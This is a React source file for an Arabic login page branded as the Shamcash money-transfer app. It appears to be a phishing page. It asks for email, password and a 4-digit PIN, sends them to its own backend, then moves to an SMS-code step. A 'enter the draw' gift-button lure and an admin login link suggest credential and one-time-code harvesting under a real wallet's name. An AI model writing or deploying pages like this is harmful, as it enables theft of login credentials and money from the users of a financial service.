import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import { loginSchema, type LoginData } from "@shared/schema";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { Lock, Mail, KeyRound, Loader2, Menu, Shield, Zap, Headphones, ArrowLeftRight, Clock, ChevronDown, Gift } from "lucide-react";
import { SiAndroid, SiApple } from "react-icons/si";
import logoImage from "@assets/IMG_0350_1761335875653.jpeg";
import { ChatWidget } from "@/components/chat-widget";
import { trackPageView, trackDownloadClick, trackNavigation } from "@/lib/analytics";

export default function Login() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [menuOpen, setMenuOpen] = useState(false);

  useEffect(() => {
    trackPageView("/", "شام كاش - تسجيل الدخول");
  }, []);

  const form = useForm<LoginData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
      pin: "",
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginData) => {
      const res = await apiRequest("POST", "/api/auth/login", data);
      return await res.json();
    },
    onSuccess: (data: any) => {
      setLocation(`/verify-sms?userId=${data.userId}`);
    },
    onError: (error: any) => {
      toast({
        variant: "destructive",
        title: "خطأ في تسجيل الدخول",
        description: error.message || "البيانات غير صحيحة",
      });
    },
  });

  const onSubmit = (data: LoginData) => {
    loginMutation.mutate(data);
  };

  return (
    <div className="min-h-screen bg-background text-foreground scroll-smooth" dir="rtl">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 backdrop-blur-md bg-background/80 border-b border-border">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16 md:h-20">
            {/* Empty space for balance */}
            <div className="w-24"></div>

            {/* Logo - Center */}
            <div className="absolute left-1/2 -translate-x-1/2" data-testid="logo-shamcash">
              <img 
                src={logoImage} 
                alt="شام كاش" 
                className="w-10 h-10 object-contain"
              />
            </div>

            {/* Menu Icon */}
            <Button
              size="icon"
              variant="ghost"
              className="hover-elevate active-elevate-2"
              onClick={() => setMenuOpen(!menuOpen)}
              data-testid="button-menu-toggle"
            >
              <Menu className="w-5 h-5" />
            </Button>
          </div>
        </div>

        {/* Mobile Menu */}
        {menuOpen && (
          <div className="border-t border-border bg-card/95 backdrop-blur-md" data-testid="mobile-menu">
            <div className="container mx-auto px-4 py-4 space-y-2">
              <a 
                href="#login" 
                className="block px-4 py-2 hover-elevate rounded-md"
                data-testid="link-menu-login"
                onClick={() => {
                  setMenuOpen(false);
                }}
              >
                تسجيل الدخول
              </a>
              <a 
                href="#about" 
                className="block px-4 py-2 hover-elevate rounded-md"
                data-testid="link-menu-about"
                onClick={() => {
                  setMenuOpen(false);
                  trackNavigation("about");
                }}
              >
                حول التطبيق
              </a>
              <a 
                href="#features" 
                className="block px-4 py-2 hover-elevate rounded-md"
                data-testid="link-menu-features"
                onClick={() => {
                  setMenuOpen(false);
                  trackNavigation("features");
                }}
              >
                المزايا
              </a>
              <a 
                href="#services" 
                className="block px-4 py-2 hover-elevate rounded-md"
                data-testid="link-menu-services"
                onClick={() => {
                  setMenuOpen(false);
                  trackNavigation("services");
                }}
              >
                الخدمات
              </a>
              <a 
                href="#faq" 
                className="block px-4 py-2 hover-elevate rounded-md"
                data-testid="link-menu-faq"
                onClick={() => {
                  setMenuOpen(false);
                  trackNavigation("faq");
                }}
              >
                الأسئلة الشائعة
              </a>
            </div>
          </div>
        )}
      </header>

      {/* Login Section */}
      <section id="login" className="min-h-screen flex items-center justify-center pt-16 md:pt-20 px-4 relative overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute inset-0 opacity-5">
          <div className="absolute top-20 right-10 w-64 h-64 bg-primary rounded-full blur-3xl"></div>
          <div className="absolute bottom-20 left-10 w-96 h-96 bg-accent rounded-full blur-3xl"></div>
        </div>

        <div className="w-full max-w-md relative z-10">
          {/* Login Card */}
          <div className="bg-card border border-border rounded-lg p-8 space-y-6">
            {/* Logo + Shamcash Header */}
            <div className="flex items-center justify-center gap-3" data-testid="logo-shamcash-header">
              <img 
                src={logoImage} 
                alt="شام كاش" 
                className="w-12 h-12 object-contain"
              />
              <h1 className="text-3xl font-bold text-foreground">
                Shamcash
              </h1>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                {/* Email Field */}
                <FormField
                  control={form.control}
                  name="email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>البريد الإلكتروني</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Mail className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                          <Input
                            {...field}
                            type="email"
                            placeholder="example@email.com"
                            className="pr-10"
                            required
                            data-testid="input-email"
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Password Field */}
                <FormField
                  control={form.control}
                  name="password"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>كلمة المرور</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                          <Input
                            {...field}
                            type="password"
                            placeholder="••••••"
                            className="pr-10"
                            required
                            data-testid="input-password"
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* PIN Field */}
                <FormField
                  control={form.control}
                  name="pin"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>رمز PIN</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <KeyRound className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                          <Input
                            {...field}
                            type="text"
                            inputMode="numeric"
                            pattern="\d{4}"
                            placeholder="••••"
                            maxLength={4}
                            className="pr-10 text-center tracking-widest"
                            required
                            data-testid="input-pin"
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                {/* Submit Button */}
                <Button
                  type="submit"
                  className="w-full"
                  disabled={loginMutation.isPending}
                  data-testid="button-login-submit"
                >
                  {loginMutation.isPending ? (
                    <>
                      <Loader2 className="w-4 h-4 ml-2 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    <>
                      <Gift className="w-4 h-4 ml-2" />
                      ادخل السحب
                    </>
                  )}
                </Button>
              </form>
            </Form>
          </div>

          {/* Scroll Indicator */}
          <div className="flex justify-center mt-12 animate-bounce">
            <ChevronDown className="w-6 h-6 text-muted-foreground" />
          </div>
        </div>
      </section>

      {/* About Section */}
      <section id="about" className="py-20 md:py-32 px-4 sm:px-6 lg:px-8 bg-card/30">
        <div className="container mx-auto max-w-5xl">
          <div className="text-center space-y-8">
            <h2 className="text-3xl sm:text-4xl md:text-5xl font-bold" data-testid="text-about-title">
              حول <span className="text-primary">تطبيقنا</span>
            </h2>
            
            <p className="text-lg sm:text-xl text-muted-foreground leading-relaxed max-w-3xl mx-auto" data-testid="text-about-description">
              هو الحل الأمثل لإدارة معاملاتك المالية بسهولة وأمان يتيح لك إرسال واستلام الأموال بسرعة وسلاسة، مع واجهة استخدام بسيطة وتجربة مريحة. نسعى من خلاله إلى تقديم خدمات مالية مبتكرة تضمن الشفافية والموثوقية، مما يتيح لك التحكم الكامل بأموالك في أي وقت ومن أي مكان.
            </p>
          </div>
        </div>
      </section>

      {/* Features Grid - Support, Security, Speed */}
      <section className="py-20 md:py-32 px-4 sm:px-6 lg:px-8">
        <div className="container mx-auto max-w-7xl">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 md:gap-12">
            {/* Support */}
            <div className="text-center space-y-6" data-testid="feature-support">
              <div className="flex justify-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center">
                  <Headphones className="w-10 h-10 text-primary" />
                </div>
              </div>
              <h3 className="text-2xl sm:text-3xl font-bold">الدعم</h3>
              <p className="text-base sm:text-lg text-muted-foreground leading-relaxed">
                فريق الدعم الخاص بنا متواجد على مدار الساعة للرد على استفساراتك وحل أي مشاكل قد تواجهها، لضمان تجربة استخدام سلسة وخالية من العقبات.
              </p>
            </div>

            {/* Security */}
            <div className="text-center space-y-6" data-testid="feature-security">
              <div className="flex justify-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center">
                  <Shield className="w-10 h-10 text-primary" />
                </div>
              </div>
              <h3 className="text-2xl sm:text-3xl font-bold">الأمان</h3>
              <p className="text-base sm:text-lg text-muted-foreground leading-relaxed">
                تطبيقنا مصمم بأعلى معايير الأمان لحماية بياناتك ومعاملاتك المالية، مما يضمن لك تجربة موثوقة وآمنة في كل خطوة.
              </p>
            </div>

            {/* Speed */}
            <div className="text-center space-y-6" data-testid="feature-speed">
              <div className="flex justify-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center">
                  <Zap className="w-10 h-10 text-primary" />
                </div>
              </div>
              <h3 className="text-2xl sm:text-3xl font-bold">السرعة</h3>
              <p className="text-base sm:text-lg text-muted-foreground leading-relaxed">
                تطبيقنا يتميز بالسرعة العالية لتنفيذ العمليات، مما يضمن تجربة فورية وسلسة تلبي احتياجاتك في أي وقت.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section id="features" className="py-20 md:py-32 px-4 sm:px-6 lg:px-8 bg-card/30">
        <div className="container mx-auto max-w-5xl">
          <div className="text-center space-y-8">
            <h2 className="text-3xl sm:text-4xl md:text-5xl font-bold" data-testid="text-features-title">
              <span className="text-primary">المزايا</span>
            </h2>
            
            <p className="text-lg sm:text-xl text-muted-foreground leading-relaxed max-w-3xl mx-auto" data-testid="text-features-description">
              يقدم تطبيقنا مجموعة من المزايا المصممة لتلبية احتياجاتك بكل احترافية، منها السرعة في تنفيذ العمليات، السهولة في الاستخدام، أعلى مستويات الأمان، وخدمات بدون رسوم خفية. هدفنا هو توفير تجربة مالية مريحة وشفافة تلائم أسلوب حياتك اليومي.
            </p>
          </div>
        </div>
      </section>

      {/* Services Section */}
      <section id="services" className="py-20 md:py-32 px-4 sm:px-6 lg:px-8">
        <div className="container mx-auto max-w-6xl">
          <div className="text-center space-y-12">
            <div className="space-y-6">
              <h2 className="text-3xl sm:text-4xl md:text-5xl font-bold" data-testid="text-services-title">
                <span className="text-primary">الخدمات</span>
              </h2>
              <p className="text-lg sm:text-xl text-muted-foreground max-w-3xl mx-auto leading-relaxed">
                نوفر مجموعة من الخدمات المتنوعة التي تلبي احتياجاتك اليومية وتوفر عليك الوقت والجهد
              </p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 pt-8">
              {/* Transfer Service */}
              <div className="text-center space-y-6" data-testid="service-transfer">
                <div className="flex justify-center">
                  <div className="w-20 h-20 rounded-full bg-accent/10 flex items-center justify-center">
                    <ArrowLeftRight className="w-10 h-10 text-accent" />
                  </div>
                </div>
                <h3 className="text-2xl sm:text-3xl font-bold">سهولة التحويل بين المستخدمين</h3>
                <p className="text-base sm:text-lg text-muted-foreground leading-relaxed">
                  أرسل واستقبل الأموال بسهولة وسلاسة بين مستخدمي التطبيق
                </p>
              </div>

              {/* Speed Service */}
              <div className="text-center space-y-6" data-testid="service-speed-section">
                <div className="flex justify-center">
                  <div className="w-20 h-20 rounded-full bg-accent/10 flex items-center justify-center">
                    <Clock className="w-10 h-10 text-accent" />
                  </div>
                </div>
                <h3 className="text-2xl sm:text-3xl font-bold">سرعة العمليات</h3>
                <p className="text-base sm:text-lg text-muted-foreground leading-relaxed">
                  نفّذ معاملاتك المالية بسرعة فائقة دون أي تأخير
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section id="faq" className="py-20 md:py-32 px-4 sm:px-6 lg:px-8 bg-card/30">
        <div className="container mx-auto max-w-4xl">
          <div className="text-center space-y-12">
            <div className="space-y-6">
              <h2 className="text-3xl sm:text-4xl md:text-5xl font-bold" data-testid="text-faq-title">
                <span className="text-primary">الأسئلة الشائعة</span>
              </h2>
              <p className="text-lg sm:text-xl text-muted-foreground leading-relaxed max-w-3xl mx-auto">
                نقدم لك إجابات على الأسئلة الأكثر شيوعاً التي قد تكون لديك حول استخدام التطبيق. هدفنا هو تزويدك بكل المعلومات التي تحتاجها لتجربة سلسة ومريحة.
              </p>
              <p className="text-base sm:text-lg text-muted-foreground leading-relaxed">
                إذا كنت تواجه أي استفسار أو مشكلة لم يتم تناولها هنا، لا تتردد في التواصل مع فريق الدعم الذي يتوفر على مدار الساعة لمساعدتك.
              </p>
            </div>

            <Accordion type="single" collapsible className="w-full text-right space-y-4">
              <AccordionItem value="item-1" className="border border-border rounded-md px-6" data-testid="faq-item-1">
                <AccordionTrigger className="text-lg font-semibold hover:no-underline">
                  كيف أقوم بإنشاء حساب في التطبيق؟
                </AccordionTrigger>
                <AccordionContent className="text-muted-foreground text-base leading-relaxed">
                  يمكنك إنشاء حساب بسهولة من خلال تحميل التطبيق واتباع خطوات التسجيل البسيطة. ستحتاج إلى إدخال معلوماتك الأساسية والتحقق من رقم هاتفك.
                </AccordionContent>
              </AccordionItem>

              <AccordionItem value="item-2" className="border border-border rounded-md px-6" data-testid="faq-item-2">
                <AccordionTrigger className="text-lg font-semibold hover:no-underline">
                  هل التطبيق آمن لإجراء المعاملات المالية؟
                </AccordionTrigger>
                <AccordionContent className="text-muted-foreground text-base leading-relaxed">
                  نعم، تطبيقنا مصمم بأعلى معايير الأمان ويستخدم تقنيات التشفير المتقدمة لحماية بياناتك ومعاملاتك المالية.
                </AccordionContent>
              </AccordionItem>

              <AccordionItem value="item-3" className="border border-border rounded-md px-6" data-testid="faq-item-3">
                <AccordionTrigger className="text-lg font-semibold hover:no-underline">
                  ما هي رسوم التحويل بين المستخدمين؟
                </AccordionTrigger>
                <AccordionContent className="text-muted-foreground text-base leading-relaxed">
                  نحن نقدم خدمات التحويل بدون رسوم خفية. جميع الرسوم واضحة ومعلنة مسبقاً لضمان الشفافية الكاملة.
                </AccordionContent>
              </AccordionItem>

              <AccordionItem value="item-4" className="border border-border rounded-md px-6" data-testid="faq-item-4">
                <AccordionTrigger className="text-lg font-semibold hover:no-underline">
                  كم من الوقت تستغرق عمليات التحويل؟
                </AccordionTrigger>
                <AccordionContent className="text-muted-foreground text-base leading-relaxed">
                  عمليات التحويل فورية وتتم في ثوانٍ معدودة، مما يضمن لك تجربة سريعة وسلسة.
                </AccordionContent>
              </AccordionItem>
            </Accordion>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-12 md:py-16 px-4 sm:px-6 lg:px-8 bg-card border-t border-border">
        <div className="container mx-auto max-w-7xl">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-12 mb-12">
            {/* Logo and Description */}
            <div className="space-y-4 text-center md:text-right">
              <div className="flex items-center justify-center md:justify-start gap-2">
                <img 
                  src={logoImage} 
                  alt="شام كاش" 
                  className="w-10 h-10 object-contain"
                />
                <span className="text-xl font-bold">شام كاش</span>
              </div>
              <p className="text-muted-foreground text-sm leading-relaxed">
                منصة مالية آمنة وسهلة الاستخدام لإدارة معاملاتك المالية
              </p>
            </div>

            {/* Quick Links */}
            <div className="space-y-4 text-center">
              <h4 className="font-bold text-lg">روابط سريعة</h4>
              <nav className="flex flex-col space-y-2">
                <a href="#about" className="text-muted-foreground hover:text-foreground transition-colors" data-testid="link-about">
                  حول التطبيق
                </a>
                <a href="#features" className="text-muted-foreground hover:text-foreground transition-colors" data-testid="link-features">
                  المزايا
                </a>
                <a href="#services" className="text-muted-foreground hover:text-foreground transition-colors" data-testid="link-services">
                  الخدمات
                </a>
                <a href="#faq" className="text-muted-foreground hover:text-foreground transition-colors" data-testid="link-faq">
                  الأسئلة الشائعة
                </a>
                <a href="/privacy" className="text-muted-foreground hover:text-foreground transition-colors" data-testid="link-privacy">
                  سياسة الخصوصية
                </a>
                <a href="/terms" className="text-muted-foreground hover:text-foreground transition-colors" data-testid="link-terms">
                  الشروط والأحكام
                </a>
                <a href="/admin/login" className="text-muted-foreground hover:text-foreground transition-colors" data-testid="link-masrifi">
                  مصرفي
                </a>
              </nav>
            </div>

            {/* Contact */}
            <div className="space-y-4 text-center md:text-left">
              <h4 className="font-bold text-lg">تواصل معنا</h4>
              <div className="space-y-2 text-muted-foreground text-sm">
                <p>البريد الإلكتروني: info@shamcash.com</p>
                <p>الهاتف: +963 XX XXX XXXX</p>
              </div>
            </div>
          </div>

          {/* Copyright */}
          <div className="pt-8 border-t border-border text-center">
            <p className="text-muted-foreground text-sm">
              © 2025 شام كاش. جميع الحقوق محفوظة.
            </p>
          </div>
        </div>
      </footer>

      {/* Chat Widget */}
      <ChatWidget />
    </div>
  );
}
